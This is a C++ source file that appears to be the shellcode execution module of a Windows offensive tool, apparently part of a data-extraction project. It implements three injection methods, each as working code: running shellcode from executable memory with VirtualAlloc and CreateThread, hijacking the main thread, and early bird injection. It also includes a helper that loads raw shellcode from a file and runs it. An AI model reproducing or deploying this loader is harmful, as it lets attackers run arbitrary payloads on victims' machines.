#include "core/extract/execution/executor.h"
#include "core/extract/execution/early_bird.h"
#include "core/extract/execution/thread_hijack.h"
#include "utils/file_logger.h"
#include <fstream>
#include <windows.h>

namespace extract {

namespace {
    bool execute_create_process(const std::vector<uint8_t>& shellcode) {
        // Allocate memory
        LPVOID baseAddress = VirtualAlloc(nullptr, shellcode.size(), 
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!baseAddress) {
            utils::FileLogger::log("[EXECUTE] Failed to allocate memory");
            return false;
        }

        // Write shellcode
        memcpy(baseAddress, shellcode.data(), shellcode.size());

        // Execute
        HANDLE thread = CreateThread(nullptr, 0, 
                                   reinterpret_cast<LPTHREAD_START_ROUTINE>(baseAddress),
                                   nullptr, 0, nullptr);
        if (!thread) {
            utils::FileLogger::log("[EXECUTE] Failed to create thread");
            VirtualFree(baseAddress, 0, MEM_RELEASE);
            return false;
        }

        CloseHandle(thread);
        return true;
    }

    bool execute_thread_hijack_wrapper(const std::vector<uint8_t>& shellcode) {
        DWORD mainThreadId = GetMainThreadId();
        HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, mainThreadId);
        if (!hThread) {
            utils::FileLogger::log("[EXECUTE] Failed to open main thread");
            return false;
        }
        
        bool result = execute_thread_hijack(hThread, shellcode.data(), shellcode.size());
        CloseHandle(hThread);
        return result;
    }

    bool execute_early_bird_wrapper(const std::vector<uint8_t>& shellcode) {
        execute_early_bird(shellcode);
        return true;
    }
}

bool execute(const std::vector<uint8_t>& shellcode, ExecutionMethod method) {
    switch (method) {
        case ExecutionMethod::CREATE_PROCESS:
            return execute_create_process(shellcode);
        case ExecutionMethod::EARLY_BIRD:
            return execute_early_bird_wrapper(shellcode);
        case ExecutionMethod::THREAD_HIJACK:
            return execute_thread_hijack_wrapper(shellcode);
        default:
            utils::FileLogger::log("[EXECUTE] Unknown execution method");
            return false;
    }
}

bool execute_from_file(const std::string& shellcode_path, ExecutionMethod method) {
    // Read shellcode file
    std::ifstream file(shellcode_path, std::ios::binary);
    if (!file) {
        utils::FileLogger::log("[EXECUTE] Failed to open shellcode file");
        return false;
    }

    // Read file content
    std::vector<uint8_t> shellcode((std::istreambuf_iterator<char>(file)),
                                  std::istreambuf_iterator<char>());
    file.close();

    if (shellcode.empty()) {
        utils::FileLogger::log("[EXECUTE] Empty shellcode file");
        return false;
    }

    return execute(shellcode, method);
}

} // namespace extract